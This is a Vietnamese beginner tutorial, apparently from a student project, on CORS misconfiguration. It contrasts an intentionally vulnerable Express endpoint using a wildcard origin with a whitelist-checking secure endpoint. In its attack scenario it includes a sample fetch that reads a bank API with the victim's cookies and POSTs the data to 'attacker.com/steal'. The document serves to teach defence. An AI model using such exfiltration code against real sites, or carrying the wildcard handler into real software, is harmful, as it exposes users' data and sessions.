# 🔐 CORS Misconfiguration - Hướng Dẫn Chi Tiết Cho Người Mới

## 📚 Mục Lục
1. [CORS là gì?](#cors-là-gì)
2. [Tại sao CORS lại nguy hiểm?](#tại-sao-cors-lại-nguy-hiểm)
3. [Dự án của chúng tôi làm gì?](#dự-án-của-chúng-tôi-làm-gì)
4. [Cách hoạt động](#cách-hoạt-động)
5. [Demo thực tế](#demo-thực-tế)
6. [Code giải thích](#code-giải-thích)
7. [Câu hỏi thường gặp](#câu-hỏi-thường-gặp)

---

# CORS là gì?

## 🤔 Giải Thích Đơn Giản

Hãy tưởng tượng:
- **Facebook.com** là nhà bạn
- **Gmail.com** là nhà bạn bè
- **Web browser** (Chrome, Firefox) là cảnh sát

### Tình huống 1: Trước khi có CORS

```
Bạn: "Cảnh sát ơi, tôi muốn lấy thông tin từ nhà bạn"
Cảnh sát: "KHÔNG! Bạn ở nhà khác, tôi không cho phép!"
```

**Kết quả:** Bạn không thể lấy data từ Gmail khi đang ở Facebook

### Tình huống 2: CORS cho phép

```
Facebook.com nói với cảnh sát: 
"Hãy để Gmail.com lấy data từ tôi"

Cảnh sát kiểm tra:
"OK, Gmail.com được phép, bạn lấy đi"
```

**Kết quả:** Gmail có thể lấy data từ Facebook

## 🔍 CORS là gì trong kỹ thuật?

**CORS = Cross-Origin Resource Sharing** (Chia sẻ tài nguyên giữa các nguồn khác nhau)

### Khái niệm "Origin"

**Origin** = Website + Port

```
http://localhost:3000    ← Origin 1
http://localhost:3001    ← Origin 2 (Khác!)
https://facebook.com     ← Origin 3 (Khác!)
https://gmail.com        ← Origin 4 (Khác!)
```

### Ví dụ Cụ Thể

```
Website 1: http://localhost:3000
├─ JavaScript chạy trên đây

Website 2: http://localhost:3001  
└─ Không được phép lấy data từ Website 1
   (Vì origin khác)
```

---

# Tại sao CORS lại nguy hiểm?

## ⚠️ Khi Cấu Hình CORS Sai

### Sai Cách 1: Dùng Wildcard `*`

```javascript
// ❌ BAD - Mở toàn bộ truy cập
res.setHeader('Access-Control-Allow-Origin', '*')
```

**Có nghĩa là gì?**
- `*` = "Bất kỳ website nào cũng được lấy data"
- Giống như nói "Tất cả mọi người đều được vào nhà tôi"

### 🚨 Tấn công nào xảy ra?

#### Kịch bản tấn công:

```
Bước 1: Attacker (hacker) tạo website độc hại
        ↓ (attacker.com)

Bước 2: Attacker nhúng code JavaScript vào website:
        ↓
        fetch('http://yourbank.com/api/account', {
          credentials: 'include'  // Gửi cookie của bạn
        })
        .then(data => fetch('attacker.com/steal', {
          method: 'POST',
          body: data  // Gửi dữ liệu về attacker
        }))

Bước 3: Bạn vô tình truy cập attacker.com
        ↓
        JavaScript chạy tự động

Bước 4: Cookie của bạn được gửi sang attacker.com
        ↓
        Attacker lấy thông tin tài khoản ngân hàng của bạn 😱
```

### 📊 Kết quả

| Có thể bị lấy cắp | Mức Độ | Chi Tiết |
|------------------|--------|---------|
| **Email, Tên, Phone** | 🔴 Cao | Dữ liệu cá nhân |
| **API Keys, Tokens** | 🔴 Cao | Có thể dùng để hack |
| **Mật khẩu** | 🔴 Cao | Nếu server không hash |
| **Credit Card** | 🔴 Cao | Nếu lưu trữ |
| **Cookies, Sessions** | 🔴 Cao | Giả mạo người dùng |

---

# Dự án của chúng tôi làm gì?

## 🎯 Mục Tiêu

Chúng tôi tạo một **ứng dụng demo** để:

1. **Hiển thị lỗ hổng CORS** (Vulnerable endpoint)
   - API trả về `Access-Control-Allow-Origin: *`
   - Bất kỳ website nào cũng lấy được data
   
2. **Hiển thị cách khắc phục** (Secure endpoint)
   - API chỉ cho phép whitelist origins
   - Website khác bị block

3. **Cho phép thực hiện tấn công**
   - Nhấn nút "Attack" trên demo
   - Xem tấn công có thành công không
   - Hiểu cách thức hoạt động

## 📁 Cấu Trúc Dự Án

```
CORS Demo Application
│
├─ Backend (Node.js + Express)
│  ├─ Endpoint ❌ VULNERABLE
│  │  └─ http://localhost:3000/security/cors/insecure-data
│  │     Returns: Access-Control-Allow-Origin: *
│  │
│  └─ Endpoint ✅ SECURE
│     └─ http://localhost:3000/security/cors/secure-data
│        Returns: Whitelist validation
│
├─ Frontend (HTML/JavaScript)
│  └─ http://localhost:3000/cors-demo/
│     ├─ Nút "Attack Vulnerable"
│     ├─ Nút "Test Secure"
│     └─ Logs hiển thị kết quả
│
└─ Production (Render.com)
   └─ https://project-webnc-1.onrender.com/cors-demo/
      (Có thể test trực tiếp trên internet)
```

---

# Cách hoạt động

## 🔄 Quy Trình Request-Response

### 1️⃣ Vulnerable Endpoint (Nguy Hiểm)

```
┌─────────────────────────────────────┐
│  Browser (Attacker's Website)       │
│  http://attacker.com                │
└──────────────┬──────────────────────┘
               │ fetch request
               ↓
┌─────────────────────────────────────┐
│  Your API Server (Vulnerable)       │
│  http://localhost:3000/insecure...  │
└──────────────┬──────────────────────┘
               │
               │ Header Response:
               │ Access-Control-Allow-Origin: *
               │
               ↓
┌─────────────────────────────────────┐
│  Browser Console                    │
│  ✅ Data lấy được!                   │
│  apiKey: 'demo-api-key-123'         │
│  email: 'security@class.demo'       │
└─────────────────────────────────────┘
```

**Kết luận:** Attacker lấy được data! 🚨

### 2️⃣ Secure Endpoint (An Toàn)

```
┌─────────────────────────────────────┐
│  Browser (Attacker's Website)       │
│  http://attacker.com                │
│  Origin Header: attacker.com        │
└──────────────┬──────────────────────┘
               │ fetch request
               ↓
┌─────────────────────────────────────┐
│  Your API Server (Secure)           │
│  http://localhost:3000/secure...    │
│                                     │
│  Check whitelist:                   │
│  Is 'attacker.com' in list?         │
│  ['localhost:3000']                 │
│  NO! ❌                              │
└──────────────┬──────────────────────┘
               │
               │ Response:
               │ HTTP 403 Forbidden
               │ (No CORS header)
               │
               ↓
┌─────────────────────────────────────┐
│  Browser Console                    │
│  ❌ CORS Error!                      │
│  "Access to XMLHttpRequest blocked" │
│  Data không lấy được!               │
└─────────────────────────────────────┘
```

**Kết luận:** Attacker không thể lấy data! ✅

---

# Demo thực tế

## 🎮 Cách Chạy Demo Trên Máy

### Bước 1: Chuẩn Bị

```bash
# Mở PowerShell / Terminal
# Di chuyển đến thư mục project
cd F:\webnc

# Cài đặt dependencies (nếu chưa)
npm install

# Chạy ứng dụng
npm start
```

**Kết quả:**
```
Example app listening on port 3000
[nodemon] restarting due to changes...
```

### Bước 2: Mở Browser

Truy cập: **http://localhost:3000/cors-demo/**

### Bước 3: Thực Hiện Attack

1. **Nhấn nút "Thực Hiện Attack"**
   - Ứng dụng sẽ gọi endpoint vulnerable
   - Xem dữ liệu được lấy

2. **Nhấn nút "Test Secure Endpoint"**
   - Ứng dụng sẽ gọi endpoint secure
   - Xem bị block

3. **Kiểm tra Browser DevTools**
   - Nhấn F12 → Tab "Network"
   - Xem Headers (CORS headers)
   - Nhấn Tab "Console"
   - Xem Logs

---

# Code giải thích

## 📝 Vulnerable Code (Cách Sai)

### File: `cors.controller.js` - Phần Vulnerable

```javascript
// ❌ VULNERABLE - Dùng wildcard
exports.insecureData = (req, res) => {
  // Không kiểm tra gì cả
  res.setHeader('Access-Control-Allow-Origin', '*')  // ← LỖI TẠI ĐÂY
  
  // Trả về dữ liệu nhạy cảm
  res.json({
    apiKey: 'demo-api-key-123',
    userEmail: 'security@class.demo',
    plan: 'premium'
  })
}
```

### Giải Thích Từng Dòng

```javascript
res.setHeader('Access-Control-Allow-Origin', '*')
│              │                              │
│              └─ Tên header CORS            └─ '*' = Bất kỳ ai
└─ Hàm set header
```

**Có nghĩa là:** "Cho phép bất kỳ website nào lấy data này"

### Kết Quả

| Người Yêu Cầu | Kết Quả |
|---------------|--------|
| facebook.com | ✅ Được |
| gmail.com | ✅ Được |
| attacker.com | ✅ Được (LỖI!) |
| Bất kỳ ai | ✅ Được |

---

## 📝 Secure Code (Cách Đúng)

### File: `cors.controller.js` - Phần Secure

```javascript
// ✅ SECURE - Dùng whitelist

// Bước 1: Định nghĩa danh sách cho phép
const getWhitelist = () => {
  const whitelist = [
    'http://localhost:3000',           // Chỉ cho phép origin này
    'https://app.yourdomain.com'       // Và cái này
  ]
  return whitelist
}

// Bước 2: Kiểm tra origin
exports.secureData = (req, res) => {
  const requestOrigin = req.headers.origin  // Lấy origin từ request
  const whitelist = getWhitelist()
  
  // Bước 3: Kiểm tra có trong whitelist không?
  const isAllowed = whitelist.includes(requestOrigin)
  
  // Bước 4: Nếu không được phép
  if (!isAllowed) {
    return res.status(403).json({
      error: 'CORS policy violation'  // Trả về lỗi
    })
  }
  
  // Bước 5: Nếu được phép, chỉ cho phép cái origin đó (không dùng *)
  res.setHeader('Access-Control-Allow-Origin', requestOrigin)
  
  // Trả về dữ liệu
  res.json({
    apiKey: 'demo-api-key-123',
    userEmail: 'security@class.demo',
    plan: 'premium'
  })
}
```

### Giải Thích Chi Tiết

#### Dòng 1: Lấy origin từ request
```javascript
const requestOrigin = req.headers.origin
```
- `req.headers` = Headers gửi từ browser
- `.origin` = Thông tin website nào gửi request
- **Ví dụ:** `http://localhost:3000` hoặc `http://attacker.com`

#### Dòng 2: Kiểm tra whitelist
```javascript
const isAllowed = whitelist.includes(requestOrigin)
```
- `whitelist.includes()` = Kiểm tra có trong danh sách không
- Giống như kiểm tra tên trong danh sách mời
- **Kết quả:** `true` (có) hoặc `false` (không)

#### Dòng 3: Nếu không được phép
```javascript
if (!isAllowed) {
  return res.status(403).json({error: 'CORS policy violation'})
}
```
- `status(403)` = HTTP error code (cấm truy cập)
- Trả về lỗi, không gửi dữ liệu

#### Dòng 4: Gửi specific origin (không dùng *)
```javascript
res.setHeader('Access-Control-Allow-Origin', requestOrigin)
```
- **Vulnerable:** `'*'` (bất kỳ ai)
- **Secure:** `requestOrigin` (chỉ cái nó gửi)
- **Ví dụ:** Nếu request từ `localhost:3000` → trả `localhost:3000` (không phải `*`)

### Kết Quả

| Người Yêu Cầu | Trong Whitelist? | Kết Quả |
|---------------|------------------|---------|
| localhost:3000 | ✅ Có | ✅ Được |
| app.yourdomain.com | ✅ Có | ✅ Được |
| attacker.com | ❌ Không | ❌ Bị Block |
| facebook.com | ❌ Không | ❌ Bị Block |

---

# Câu Hỏi Thường Gặp

## ❓ Q1: Tại sao không dùng `*` cho mọi người?

**Trả lời:**
```
❌ WRONG:
Access-Control-Allow-Origin: *
↓
Bất kỳ website nào cũng lấy được data
↓
Attacker từ attacker.com cũng lấy được

✅ RIGHT:
Access-Control-Allow-Origin: http://trusted.com
↓
Chỉ trusted.com lấy được data
↓
Attacker.com bị block
```

---

## ❓ Q2: CORS headers là gì?

**Trả lời:**
CORS headers = Thông điệp từ server cho browser

```
Browser hỏi: "Tôi từ attacker.com, tôi có thể lấy data không?"

Server trả lời trong CORS headers:
- "Access-Control-Allow-Origin: http://trusted.com"  (Chỉ trusted.com)
- Hoặc: "Access-Control-Allow-Origin: *"  (Bất kỳ ai)

Browser quyết định:
- Nếu match request origin → Cho phép
- Nếu không match → Block (CORS Error)
```

---

## ❓ Q3: Whitelist là gì?

**Trả lời:**
Whitelist = Danh sách cho phép (như danh sách mời)

```javascript
Whitelist = ['http://localhost:3000', 'https://app.com']

┌─ Kiểm tra ─┐
│ attacker.com có trong list? 
│ ['http://localhost:3000', 'https://app.com']
│ KHÔNG! ❌
└─ Kết quả: BLOCK
```

---

## ❓ Q4: Demo này giúp gì?

**Trả lời:**
1. **Hiểu rõ CORS** - Thấy được cách hoạt động
2. **Hiểu vấn đề** - Tại sao wildcard `*` nguy hiểm
3. **Học cách khắc phục** - Dùng whitelist thay vì `*`
4. **Thực hành** - Nhấn nút, xem kết quả trực tiếp

---

## ❓ Q5: Điều gì xảy ra nếu không thiết lập CORS?

**Trả lời:**
```
Bình thường (Default):
- Mọi request từ different origin bị BLOCK
- Browser: "CORS Error: No Access-Control-Allow-Origin"
- Dữ liệu không được gửi

Với CORS (Correct):
- Server quyết định ai được phép
- Browser check → Cho phép hoặc Block
```

---

## ❓ Q6: Credentials là gì?

**Trả lời:**
Credentials = Cookie + Token (chứng chỉ)

```javascript
// Gửi credentials (cookies)
fetch('http://api.com/user', {
  credentials: 'include'  // ← Gửi cookie
})

// Server nhận cookie → Biết đây là ai
// Trả về data riêng tư của người đó
```

**Nguy hiểm nếu CORS sai:**
```
Attacker.com gửi request + credentials
↓
Browser tự động gửi cookie của bạn
↓
Server: "Tôi nhận ra bạn (từ cookie)"
↓
Trả dữ liệu của bạn cho attacker
```

---

## ❓ Q7: Production (Render.com) có khác gì không?

**Trả lời:**

| Local | Production |
|-------|-----------|
| http://localhost:3000 | https://project-webnc-1.onrender.com |
| Chỉ máy của bạn | Trên internet, ai cũng lấy được |
| Test nhanh | Test thực tế |

**Cùng demo, chỉ khác URL**

---

## ❓ Q8: Làm sao để test nếu CORS đúng?

**Trả lời:**

**Cách 1: Browser Console**
```javascript
// Mở DevTools (F12)
// Tab Console
// Paste code:
fetch('http://localhost:3000/security/cors/secure-data', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => console.log(data))

// Kết quả:
// ✅ Nếu origin match: Nhận được data
// ❌ Nếu không: CORS Error
```

**Cách 2: Postman**
- Set Header: `Origin: http://attacker.com`
- Send request
- Xem CORS headers trong response

**Cách 3: cURL**
```bash
curl -H "Origin: http://attacker.com" \
  http://localhost:3000/security/cors/secure-data
```

---

# 🎓 Tóm Tắt

## Điều Quan Trọng Cần Nhớ

| Điểm | Chi Tiết |
|-----|---------|
| **CORS là gì** | Cơ chế cho phép website khác truy cập data |
| **Vấn đề** | `Access-Control-Allow-Origin: *` = Cho phép bất kỳ ai |
| **Nguy Hiểm** | Attacker lấy được data nhạy cảm |
| **Giải Pháp** | Dùng whitelist thay vì `*` |
| **Demo của chúng tôi** | Cho thấy vulnerable vs secure cách làm |
| **Cách khắc phục** | Kiểm tra origin, chỉ cho whitelist được phép |

---

# 🚀 Bước Tiếp Theo

## Để Thử Demo

1. ✅ Chạy `npm start`
2. ✅ Mở `http://localhost:3000/cors-demo/`
3. ✅ Nhấn nút "Attack"
4. ✅ Xem logs
5. ✅ Mở DevTools (F12) → Network tab
6. ✅ Kiểm tra CORS headers

## Để Hiểu Sâu Hơn

- 📖 Đọc file `CORS_VULNERABILITY.md` trong project
- 🔗 Tham khảo [OWASP CORS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html)
- 📺 Xem video demo trong slide presentation

---

**Viết bởi:** Nhóm CORS Demo  
**Ngày:** December 2025  
**Phiên bản:** 1.0

---

*Nếu có câu hỏi, hãy tham khảo phần "Câu Hỏi Thường Gặp" hoặc liên hệ nhóm.*
